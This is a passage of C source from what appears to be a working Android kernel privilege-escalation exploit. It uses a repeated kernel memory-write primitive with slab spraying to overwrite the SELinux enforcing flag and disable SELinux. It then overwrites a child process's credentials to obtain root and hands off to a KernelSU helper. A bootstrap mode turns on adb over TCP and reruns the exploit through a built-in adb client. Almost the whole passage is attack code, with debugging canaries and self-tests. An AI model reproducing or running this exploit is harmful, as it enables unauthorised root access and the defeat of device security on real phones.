    /* WRITE_CANARY: verify ghost write mechanism on perf_event_paranoid.
     * WARNING: this clobbers perf_event_paranoid, breaking perf-based KASLR
     * detection on subsequent runs until reboot. Only use for debugging. */
    if (env_flag("WRITE_CANARY", 0) && probe_off) {
      uintptr_t canary_target = kaslr_slide
          ? text_addr(KIMAGE_TEXT_BASE + probe_off)
          : data_addr(KIMAGE_TEXT_BASE + probe_off);
      char pre[32] = {0};
      FILE *pf = fopen(probe_path, "r");
      if (pf) { fgets(pre, sizeof(pre), pf); fclose(pf); }
      pre[strcspn(pre, "\r\n")] = '\0';
      pr_info("AUTO_CANARY: probe=%s pre='%s' target=0x%zx base=0x%zx slide=0x%zx\n",
              probe_path, pre, canary_target,
              (size_t)kaslr_base, (size_t)kaslr_slide);
      do_one_write(canary_target, "AUTO_CANARY: probe", 1);
      usleep(200000);
      char post[32] = {0};
      pf = fopen(probe_path, "r");
      if (pf) { fgets(post, sizeof(post), pf); fclose(pf); }
      post[strcspn(post, "\r\n")] = '\0';
      pr_info("AUTO_CANARY: post='%s' (was '%s')\n", post, pre);
      if (strcmp(pre, post) != 0) {
        pr_success("AUTO_CANARY: ghost write CONFIRMED — mechanism works!\n");
      } else {
        pr_error("AUTO_CANARY: ghost write FAILED — probe unchanged. "
                 "KASLR base may be wrong or spray page not at expected address.\n");
      }
    }
    if (env_flag("SKIP_W1", 0)) {
      pr_info("SKIP_W1: bypassing W1, SELinux stays enforcing\n");
      selinux_ok = 1;
      goto w1_done;
    }
    int w1_max = env_flag("W1_ATTEMPTS", 5);
    for (int att = 1; att <= w1_max && !selinux_ok; att++) {
      pr_info("Write 1 attempt %d/%d\n", att, w1_max);
      uintptr_t w1_target = kaslr_slide
          ? text_addr(SELINUX_ENFORCING)
          : data_addr(SELINUX_ENFORCING);
      pr_info("W1 target: 0x%016zx (%s) selinux_state=0x%zx\n", w1_target,
              kaslr_slide ? "KIMAGE via KASLR slide" : "direct-map alias",
              (size_t)(kaslr_base + SELINUX_ENFORCING_OFF));
      do_one_write(w1_target, "W1: SELinux", 1);
      usleep(100000);
      if (check_selinux_off()) { pr_success("SELinux DISABLED\n"); selinux_ok = 1; }
    }
    if (!selinux_ok) { pr_error("Write 1 failed\n"); return 1; }
    w1_done:
    TIMER("Write 1 complete");
  } else if (!selinux_ok && root_child_done) {
    selinux_ok = 1;
  } else {
    pr_success("SELinux off (UMH or already)\n");
  }

  /* Phase 2: Check if UMH root succeeded */
  if (root_child_done) {
    pr_success("UMH root done — skipping W2\n");
    TIMER("exploit complete (UMH)");
    pr_info("waiting for KernelSU helper...\n");
    return wait_for_ksu_status();
  }

  /* Phase 2 fallback: Find child task_struct + cred overwrite */
  pr_info("UMH not available, falling back to W2 cred path\n");
  slab_drain();
  TIMER("pre-W2 drain");

  struct child_pipes pipes;
  pid_t child = spawn_child(&pipes);
  if (child < 0) { pr_error("fork failed\n"); return 1; }

  uintptr_t child_task = 0;
  read(pipes.task_r, &child_task, sizeof(child_task));
  close(pipes.task_r);
  TIMER("perf_find_task done");

  if (!child_task) {
    pr_info("perf returned 0, retrying...\n");
    waitpid(child, NULL, 0);
    child = spawn_child(&pipes);
    if (child < 0) { pr_error("retry fork failed\n"); return 1; }
    read(pipes.task_r, &child_task, sizeof(child_task));
    close(pipes.task_r);
  }

  if (!child_task) {
    pr_error("Cannot find task_struct (perf blocked by seccomp?)\n");
    close(pipes.cmd_w);
    waitpid(child, NULL, 0);
    return 1;
  }

  pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
  pselect_child_node = 1;

  if (env_flag("W2_CANARY", 0)) {
    uintptr_t canary_target = data_addr(KIMAGE_TEXT_BASE + 0x0279A4D0);
    char pre[32] = {0};
    FILE *pf = fopen("/proc/sys/kernel/perf_event_paranoid", "r");
    if (pf) { fgets(pre, sizeof(pre), pf); fclose(pf); }
    pre[strcspn(pre, "\r\n")] = '\0';
    pr_info("W2_CANARY: target=0x%zx pre='%s'\n", canary_target, pre);
    do_one_write(canary_target, "W2_CANARY: perf", 2);
    usleep(200000);
    char post[32] = {0};
    pf = fopen("/proc/sys/kernel/perf_event_paranoid", "r");
    if (pf) { fgets(post, sizeof(post), pf); fclose(pf); }
    post[strcspn(post, "\r\n")] = '\0';
    pr_info("W2_CANARY: post='%s' (was '%s')\n", post, pre);
    if (strcmp(pre, post) != 0)
      pr_success("W2_CANARY: mode-2 ghost write CONFIRMED!\n");
    else
      pr_error("W2_CANARY: mode-2 ghost write FAILED — pi_dequeue not reached?\n");
  }

  if (env_flag("W2_TARGET_SELFTEST", 0)) {
    pr_info("W2_TARGET_SELFTEST: write to child_task+CRED_OFF using mode 1.\n"
            "  child_task=0x%016zx target=0x%016zx\n"
            "  If this crashes: child_task slab page is read-only.\n"
            "  If this survives: target is writable, mode 2 overlay is the issue.\n",
            child_task, child_task + TASK_CRED_OFF);
    crash_log_write("W2_TARGET_SELFTEST: child_task=0x%016zx target=0x%016zx\n",
                    child_task, child_task + TASK_CRED_OFF);
    slab_drain();
    do_one_write(child_task + TASK_CRED_OFF, "W2_TARGET_SELFTEST", 1);
    usleep(200000);
    pr_info("W2_TARGET_SELFTEST: survived! target IS writable.\n");
    crash_log_write("W2_TARGET_SELFTEST: survived\n");
    close(pipes.cmd_w); close(pipes.uid_r);
    waitpid(child, NULL, 0);
    return 0;
  }

  if (env_flag("W2_SIDEWRITE_TEST", 0)) {
    pr_info("W2_SIDEWRITE_TEST: testing init_cred side-write only.\n"
            "  tree_pc = init_cred KIMAGE, target = spray page (safe).\n"
            "  If this crashes: init_cred page is read-only in KIMAGE.\n"
            "  If this survives: side-write is fine, crash is elsewhere.\n");
    slab_drain();
    uintptr_t safe_target = page_base ? (page_base + 0x200) : 0;
    if (!safe_target) {
      pr_error("W2_SIDEWRITE_TEST: no page_base from W1, running a dummy spray\n");
      safe_target = child_task + TASK_CRED_OFF;
    }
    do_one_write(safe_target, "W2_SIDEWRITE_TEST", 2);
    usleep(200000);
    pr_info("W2_SIDEWRITE_TEST: survived! init_cred KIMAGE page is writable.\n");
    close(pipes.cmd_w); close(pipes.uid_r);
    waitpid(child, NULL, 0);
    return 0;
  }

  /* Validate child is still alive before W2 */
  {
    char proc_path[64];
    snprintf(proc_path, sizeof(proc_path), "/proc/%d/status", child);
    int pfd = open(proc_path, O_RDONLY);
    if (pfd >= 0) {
      char sbuf[256] = {0};
      read(pfd, sbuf, sizeof(sbuf)-1);
      close(pfd);
      pr_info("child %d alive: %.60s\n", child, sbuf);
    } else {
      pr_error("child %d NOT FOUND in /proc! errno=%d\n", child, errno);
    }
  }
  int w2_dry_run = env_flag("W2_DRY_RUN", 0);
  if (w2_dry_run)
    pr_info("W2_DRY_RUN: chain walk only, target redirected to spray page\n");
  crash_log_write("W2_REAL: child_task=0x%016zx target=0x%016zx page_base=0x%016zx dry=%d\n",
                  child_task, child_task + TASK_CRED_OFF, page_base, w2_dry_run);

  int got_root = 0;
  for (int round = 1; round <= 10 && !got_root; round++) {
    pr_info("round %d/10: cred write%s\n", round, w2_dry_run ? " (DRY RUN)" : "");
    crash_log_write("W2_round=%d target=0x%016zx dry=%d\n", round,
                    child_task + TASK_CRED_OFF, w2_dry_run);
    slab_drain();
    uintptr_t w2_target = child_task + TASK_CRED_OFF;
    if (!do_one_write(w2_target, "W2: cred", 2)) {
      pr_warning("W2: cred preparation failed on round %d\n", round);
      continue;
    }
    crash_log_write("W2_DOW_DONE round=%d\n", round);
    usleep(50000);
    crash_log_write("W2_SLEEP_DONE round=%d\n", round);
    /* Check pipe fds are still valid before using them */
    int cmd_flags = fcntl(pipes.cmd_w, F_GETFL);
    int uid_flags = fcntl(pipes.uid_r, F_GETFL);
    int child_alive = kill(child, 0) == 0;
    crash_log_write("W2_PIPE round=%d cmd_flags=%d uid_flags=%d alive=%d\n",
                    round, cmd_flags, uid_flags, child_alive);
    pr_info("pipe check: cmd_w=%d flags=%d uid_r=%d flags=%d child_alive=%d\n",
            pipes.cmd_w, cmd_flags, pipes.uid_r, uid_flags, child_alive);
    crash_log_write("W2_WRITE_C round=%d\n", round);
    ssize_t wn = write(pipes.cmd_w, "C", 1);
    crash_log_write("W2_WROTE round=%d wn=%zd errno=%d\n", round, wn, errno);
    uint32_t child_uid = 9999;
    crash_log_write("W2_READ_UID round=%d\n", round);
    ssize_t rn = read(pipes.uid_r, &child_uid, sizeof(child_uid));
    pr_info("child uid = %u (pipe: wrote=%zd read=%zd errno=%d)\n",
            child_uid, wn, rn, errno);
    crash_log_write("W2_UID round=%d uid=%u wrote=%zd read=%zd\n",
                    round, child_uid, wn, rn);
    if (child_uid == 0) { pr_success("child is root!\n"); got_root = 1; }
  }

  write(pipes.cmd_w, "G", 1);
  usleep(200000);
  close(pipes.cmd_w); close(pipes.uid_r);

  if (!got_root) {
    pr_error("failed after 10 rounds\n");
    crash_log_write("W2_FAIL: no root after 10 rounds\n");
    waitpid(child, NULL, 0);
    return 1;
  }
  crash_log_write("W2_SUCCESS: got root\n");

  sleep(2);
  TIMER("exploit complete");

  pr_info("waiting for KernelSU helper...\n");
  int ksu_rc = wait_for_ksu_status();

  /* W2 cred copy lives on the spray page held by reclaim_sv[].
   * If this process exits, the socket closes and the SKB buffer is freed,
   * leaving the parked child's cred pointer dangling.  Park instead. */
  if (!ksu_rc) {
    pr_info("parking parent to keep spray page alive\n");
    for (;;) pause();
  }
  return ksu_rc;
}

int install_embedded_wallpaper(void) { return 0; }

static int run_write1_only(void);
extern int mini_adb_port;
extern int mini_adb_shell(const char *cmd);

/* --bootstrap mode: runs from app context (any UID, with seccomp).
 * 1) Write 1 → SELinux off
 * 2) setprop to enable adb TCP on 5555 (SELinux off → property_service allows it)
 * 3) mini-adb connects to 127.0.0.1:5555, authenticates with pre-pushed key,
 *    runs full exploit via adb shell (no app seccomp → perf works)
 */
static int run_bootstrap(void) {
  log_startup_context();

  /* Keep W1's spray, reclaim sockets, and PI helper threads out of the
   * process that later launches W2 through adb.  W1 deliberately leaves its
   * reclaimed page held until the owning process exits; running W1 inline
   * would therefore let that state interfere with W2 in the shell process. */
  pid_t w1_child = fork();
  if (w1_child < 0) {
    pr_error("cannot fork W1 helper errno=%d\n", errno);
    return 1;
  }
  if (w1_child == 0) {
    _exit(run_write1_only());
  }

  int w1_status;
  pid_t waited;
  do {
    waited = waitpid(w1_child, &w1_status, 0);
  } while (waited < 0 && errno == EINTR);
  if (waited < 0) {
    pr_error("waiting for W1 helper failed errno=%d\n", errno);
    return 1;
  }
  if (!WIFEXITED(w1_status) || WEXITSTATUS(w1_status) != 0) {
    pr_error("W1 helper failed status=%d\n", w1_status);
    return 1;
  }
  pr_info("W1 helper exited; reclaimed state released before W2\n");

  /* Wait for adb TCP — read the actual port from system property */
  int adb_port = 5555;
  char port_buf[32] = {};
  read_first_line("/data/local/tmp/a/adb_port", port_buf, sizeof(port_buf));
  if (port_buf[0]) adb_port = atoi(port_buf);
  if (adb_port <= 0 || adb_port > 65535) adb_port = 5555;
  pr_info("Waiting for adb TCP on port %d...\n", adb_port);
  for (int i = 0; i < 30; i++) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {
      .sin_family = AF_INET,
      .sin_port = htons(adb_port),
      .sin_addr.s_addr = htonl(0x7f000001)
    };
    int c = (sock >= 0) ? connect(sock, (struct sockaddr *)&addr, sizeof(addr)) : -1;
    if (sock >= 0) close(sock);
    if (c == 0) {
      pr_success("adbd ready on port %d (attempt %d)\n", adb_port, i + 1);
      goto tcp_ready;
    }
    usleep(1000000);
  }
  pr_error("adbd not on TCP %d after 30s\n", adb_port);
  return 1;
tcp_ready:
  usleep(200000);
  mini_adb_port = adb_port;
  pr_info("Connecting via mini-adb on port %d...\n", adb_port);
  int adb_ret = mini_adb_shell("/data/local/tmp/a/e");
  pr_info("mini-adb returned %d\n", adb_ret);

  return adb_ret;
}

static int run_write1_only(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  crash_log_init("/data/local/tmp/exploit.log");
  {
    struct sigaction sa = {.sa_handler = fatal_signal_handler, .sa_flags = SA_RESETHAND};
    sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    sigaction(SIGABRT, &sa, NULL);
  }
  if (!active_offsets && select_offsets() < 0) return 1;
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets->kimage_text_base) {
    kaslr_base = active_offsets->kimage_text_base;
  }
  kaslr_done = 1;

  if (check_selinux_off()) {
    pr_success("SELinux already off\n");
    return 0;
  }

  for (int att = 1; att <= 20; att++) {
    slab_drain();
    pr_info("Write 1 attempt %d/20\n", att);
    do_one_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1);
    usleep(100000);
    if (check_selinux_off()) {
      pr_success("SELinux DISABLED\n");
      return 0;
    }
  }
  pr_error("Write 1 failed after 20 attempts\n");
  return 1;
}

int main(int argc, char **argv) {
    handle_umh_mode(argc, argv);
    if (argc > 1 && strcmp(argv[1], "--bootstrap") == 0)
        return run_bootstrap();
    if (argc > 1 && strcmp(argv[1], "--write1") == 0)
        return run_write1_only();
    return run_exploit(argc, argv);
}
